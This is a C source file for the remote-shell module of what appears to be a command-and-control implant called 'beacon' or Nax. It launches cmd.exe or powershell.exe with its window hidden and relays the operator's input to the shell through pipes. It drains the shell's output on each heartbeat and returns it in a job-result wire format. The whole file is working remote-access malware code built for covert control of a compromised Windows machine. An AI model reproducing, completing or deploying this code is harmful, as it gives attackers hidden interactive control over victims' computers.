/* beacon/src/Commands/Shell.c
 * Remote interactive shell - bidirectional pipe to cmd.exe/powershell.exe.
 * Shells live in Nax->ShellHead; output is drained by NaxProcessShells on
 * each heartbeat and returned in job-result wire format. */

#include "Nax.h"

#define SHELL_READ_BUF 4096u

/* ========= [ linked-list helpers ] ========= */

FUNC static NAX_SHELL* ShellFind( PNAX_INSTANCE Nax, UINT32 terminalId ) {
    NAX_SHELL* s = Nax->ShellHead;
    while ( s ) {
        if ( s->TerminalId == terminalId )
            return s;
        s = s->Next;
    }
    return NULL;
}

FUNC static VOID ShellFree( PNAX_INSTANCE Nax, NAX_SHELL* s ) {
    if ( s->hStdinWrite )  Nax->Kernel32.CloseHandle( s->hStdinWrite );
    if ( s->hStdoutRead )  Nax->Kernel32.CloseHandle( s->hStdoutRead );
    if ( s->hThread )      Nax->Kernel32.CloseHandle( s->hThread );
    if ( s->hProcess )     Nax->Kernel32.CloseHandle( s->hProcess );
    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, s );
}

/* ========= [ CmdShellStart ] ========= */

FUNC static VOID CmdShellStart( PNAX_INSTANCE Nax, UINT32 terminalId, const PBYTE args, UINT32 argsLen ) {
    if ( argsLen < 4 ) return;

    UINT32 progLen = NaxR32( args );
    if ( 4 + progLen > argsLen || progLen == 0 ) return;

    PCHAR cmdline = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, progLen + 1 );
    if ( !cmdline ) return;
    MmCopy( cmdline, args + 4, progLen );
    cmdline[ progLen ] = '\0';

    /* create stdin pipe: parent writes, child reads */
    HANDLE hStdinRead  = NULL;
    HANDLE hStdinWrite = NULL;
    /* create stdout pipe: child writes, parent reads */
    HANDLE hStdoutRead  = NULL;
    HANDLE hStdoutWrite = NULL;

    SECURITY_ATTRIBUTES sa;
    MmZero( &sa, sizeof( sa ) );
    sa.nLength        = sizeof( SECURITY_ATTRIBUTES );
    sa.bInheritHandle = TRUE;

    if ( !Nax->Kernel32.CreatePipe( &hStdinRead, &hStdinWrite, &sa, 0 ) ) {
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, cmdline );
        return;
    }

    if ( !Nax->Kernel32.CreatePipe( &hStdoutRead, &hStdoutWrite, &sa, 0 ) ) {
        Nax->Kernel32.CloseHandle( hStdinRead );
        Nax->Kernel32.CloseHandle( hStdinWrite );
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, cmdline );
        return;
    }

    STARTUPINFOA si;
    MmZero( &si, sizeof( si ) );
    si.cb          = sizeof( STARTUPINFOA );
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = hStdinRead;
    si.hStdOutput  = hStdoutWrite;
    si.hStdError   = hStdoutWrite;

    PROCESS_INFORMATION pi;
    MmZero( &pi, sizeof( pi ) );

    BOOL ok = Nax->Kernel32.CreateProcessA( NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi );
    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, cmdline );

    /* child-side pipe ends are now owned by the child; close our copies */
    Nax->Kernel32.CloseHandle( hStdinRead );
    Nax->Kernel32.CloseHandle( hStdoutWrite );

    if ( !ok ) {
        Nax->Kernel32.CloseHandle( hStdinWrite );
        Nax->Kernel32.CloseHandle( hStdoutRead );
        return;
    }

    NAX_SHELL* s = (NAX_SHELL*)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, sizeof( NAX_SHELL ) );
    if ( !s ) {
        Nax->Ntdll.NtTerminateProcess( pi.hProcess, 0 );
        Nax->Kernel32.CloseHandle( pi.hProcess );
        Nax->Kernel32.CloseHandle( pi.hThread );
        Nax->Kernel32.CloseHandle( hStdinWrite );
        Nax->Kernel32.CloseHandle( hStdoutRead );
        return;
    }

    MmZero( s, sizeof( NAX_SHELL ) );
    s->TerminalId  = terminalId;
    s->hProcess    = pi.hProcess;
    s->hThread     = pi.hThread;
    s->hStdinWrite = hStdinWrite;
    s->hStdoutRead = hStdoutRead;
    s->State       = NAX_JOB_RUNNING;
    s->Started     = 0;

    s->Next         = Nax->ShellHead;
    Nax->ShellHead  = s;

    Nax->Kernel32.SetEvent( Nax->JobWakeEvent );
}

/* ========= [ CmdShellWrite ] ========= */

FUNC static VOID CmdShellWrite( PNAX_INSTANCE Nax, const PBYTE args, UINT32 argsLen ) {
    if ( argsLen < 8 ) return;

    UINT32 terminalId = NaxR32( args );
    UINT32 dataLen    = NaxR32( args + 4 );
    if ( 8 + dataLen > argsLen || dataLen == 0 ) return;

    NAX_SHELL* s = ShellFind( Nax, terminalId );
    if ( !s || s->State != NAX_JOB_RUNNING ) return;

    DWORD written = 0;
    Nax->Kernel32.WriteFile( s->hStdinWrite, args + 8, dataLen, &written, NULL );
}

/* ========= [ CmdShellClose ] ========= */

FUNC static VOID CmdShellClose( PNAX_INSTANCE Nax, const PBYTE args, UINT32 argsLen ) {
    if ( argsLen < 4 ) return;

    UINT32 terminalId = NaxR32( args );
    NAX_SHELL* s = ShellFind( Nax, terminalId );
    if ( !s ) return;

    s->State = NAX_JOB_KILLED;
    Nax->Kernel32.SetEvent( Nax->JobWakeEvent );
}

/* ========= [ NaxShellDispatch ] ========= */

FUNC VOID NaxShellDispatch( PNAX_INSTANCE Nax, UINT32 taskId, BYTE cmdId, const PBYTE args, UINT32 argsLen ) {
    if ( cmdId == NAX_CMD_SHELL_START )
        CmdShellStart( Nax, taskId, args, argsLen );
    else if ( cmdId == NAX_CMD_SHELL_WRITE )
        CmdShellWrite( Nax, args, argsLen );
    else if ( cmdId == NAX_CMD_SHELL_CLOSE )
        CmdShellClose( Nax, args, argsLen );
}

/* ========= [ NaxProcessShells - heartbeat drain ] ========= */

FUNC UINT32 NaxProcessShells( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap ) {
    UINT32 written = 0;
    NAX_SHELL** pp = &Nax->ShellHead;

    while ( *pp ) {
        NAX_SHELL* s = *pp;

        /* ---- alive: drain stdout ---- */
        if ( s->State == NAX_JOB_RUNNING ) {

            /* send empty output once as STARTING notification */
            if ( !s->Started ) {
                if ( written + 9 <= out_cap ) {
                    out[ written ] = NAX_JOB_OUTPUT;
                    NaxW32( out + written + 1, s->TerminalId );
                    NaxW32( out + written + 5, 0 );
                    written += 9;
                }
                s->Started = 1;
            }

            /* check whether child has exited */
            BOOL exited = ( Nax->Kernel32.WaitForSingleObject( s->hProcess, 0 ) == WAIT_OBJECT_0 );

            /* drain available stdout bytes - read directly into out to avoid extra stack buf */
            for ( ;; ) {
                DWORD avail = 0;
                if ( !Nax->Kernel32.PeekNamedPipe( s->hStdoutRead, NULL, 0, NULL, &avail, NULL ) || avail == 0 )
                    break;

                UINT32 hdr_off  = written;
                UINT32 data_off = written + 9;
                if ( data_off >= out_cap ) break;

                UINT32 space   = out_cap - data_off;
                DWORD toRead   = ( avail < space ) ? avail : (DWORD)space;
                if ( toRead > SHELL_READ_BUF ) toRead = SHELL_READ_BUF;

                DWORD bytesRead = 0;
                if ( !Nax->Kernel32.ReadFile( s->hStdoutRead, out + data_off, toRead, &bytesRead, NULL ) || bytesRead == 0 )
                    break;

                out[ hdr_off ] = NAX_JOB_OUTPUT;
                NaxW32( out + hdr_off + 1, s->TerminalId );
                NaxW32( out + hdr_off + 5, bytesRead );
                written += 9 + bytesRead;
            }

            if ( exited )
                s->State = NAX_JOB_FINISHED;

            pp = &s->Next;
            continue;
        }

        /* ---- finished or killed: final drain + send completion + unlink ---- */
        BYTE final_type = ( s->State == NAX_JOB_KILLED ) ? NAX_JOB_KILLED : NAX_JOB_COMPLETE;

        if ( s->State == NAX_JOB_KILLED ) {
            /* terminate the child process */
            Nax->Ntdll.NtTerminateProcess( s->hProcess, 0 );
        }

        /* drain any remaining stdout before reporting completion */
        for ( ;; ) {
            DWORD avail = 0;
            if ( !Nax->Kernel32.PeekNamedPipe( s->hStdoutRead, NULL, 0, NULL, &avail, NULL ) || avail == 0 )
                break;

            UINT32 hdr_off  = written;
            UINT32 data_off = written + 9;
            if ( data_off >= out_cap ) break;

            UINT32 space  = out_cap - data_off;
            DWORD toRead  = ( avail < space ) ? avail : (DWORD)space;
            if ( toRead > SHELL_READ_BUF ) toRead = SHELL_READ_BUF;

            DWORD bytesRead = 0;
            if ( !Nax->Kernel32.ReadFile( s->hStdoutRead, out + data_off, toRead, &bytesRead, NULL ) || bytesRead == 0 )
                break;

            out[ hdr_off ] = NAX_JOB_OUTPUT;
            NaxW32( out + hdr_off + 1, s->TerminalId );
            NaxW32( out + hdr_off + 5, bytesRead );
            written += 9 + bytesRead;
        }

        /* send completion record */
        if ( final_type == NAX_JOB_COMPLETE ) {
            /* 4-byte exit status as data (via NtQueryInformationProcess) */
            PROCESS_BASIC_INFORMATION pbi;
            MmZero( &pbi, sizeof( pbi ) );
            Nax->Ntdll.NtQueryInformationProcess( s->hProcess, ProcessBasicInformation, &pbi, sizeof( pbi ), NULL );
            UINT32 exitCode = (UINT32)pbi.ExitStatus;

            if ( written + 13 <= out_cap ) {
                out[ written ] = NAX_JOB_COMPLETE;
                NaxW32( out + written + 1, s->TerminalId );
                NaxW32( out + written + 5, 4 );
                NaxW32( out + written + 9, exitCode );
                written += 13;
            }
        } else {
            /* KILLED: empty data */
            if ( written + 9 <= out_cap ) {
                out[ written ] = NAX_JOB_KILLED;
                NaxW32( out + written + 1, s->TerminalId );
                NaxW32( out + written + 5, 0 );
                written += 9;
            }
        }

        /* unlink */
        *pp = s->Next;
        ShellFree( Nax, s );
    }

    return written;
}
